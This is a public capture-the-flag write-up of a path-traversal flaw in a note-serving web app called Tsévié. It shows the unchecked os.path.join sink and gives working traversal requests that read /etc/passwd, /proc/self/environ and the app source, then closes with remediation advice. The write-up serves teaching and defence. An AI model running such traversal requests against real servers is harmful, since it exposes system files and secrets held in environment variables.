# Tsévié — path traversal to the process environment for the flag

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/tsevie/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Tsévié serves notes with `GET /api/note?file=...` and joins my
> input straight onto the notes directory, so `../../../../etc/passwd` reads any
> file. The flag isn't on disk though — it's an environment variable, so I read
> `/proc/self/environ` through the same traversal and pull `FLAG=` out of it.
> **Flag:** `NCTF{0bba…}`.

## 1. Briefing

A note-reading service: notes are text files served online. The flag is "somewhere
on the server" — vague enough that arbitrary file read is probably the point.

## 2. Reconnaissance

```
GET / → {"message":"Consultez vos notes via /api/note?file=...","service":"Tsévié"}
```

So there's one endpoint, `/api/note`, and it takes a `file` parameter I control.

## 3. Analysis

The handler joins my input onto the notes directory with no checks:

```python
with open(os.path.join(NOTES_DIR, filename), 'r') as f:
    content = f.read()
```

`os.path.join(base, "../../x")` cheerfully escapes `base`, so I get arbitrary
file read. I confirm with the classic:

```
GET /api/note?file=../../../../etc/passwd   → full /etc/passwd
```

## 4. Exploitation

Reading obvious flag paths comes up empty — the flag is an **environment
variable**, not a file. procfs exposes the process environment, so I read it
through the same traversal:

```
GET /api/note?file=../../../../proc/self/environ
```

The NUL-separated response contains:

```
PWD=/app
FLAG=NCTF{0bba…}
```

For good measure, `../../../../app/app.py` confirms the vulnerable sink and
`../../../../proc/self/cmdline` shows it's a plain `python app.py`.

## 5. Flag

```text
NCTF{0bba…}
```

## 6. Lessons & remediation

- **Resolve and confine the path.** `os.path.realpath` the joined path and check
  it stays under `NOTES_DIR` with `os.path.commonpath`, or reject any `file`
  containing `/`, `..`, or an absolute path.
- **Secrets in the environment are readable.** Once there's arbitrary read,
  `/proc/self/environ` leaks every env var — keep flags/secrets out of the
  process environment, or run with a restricted procfs.
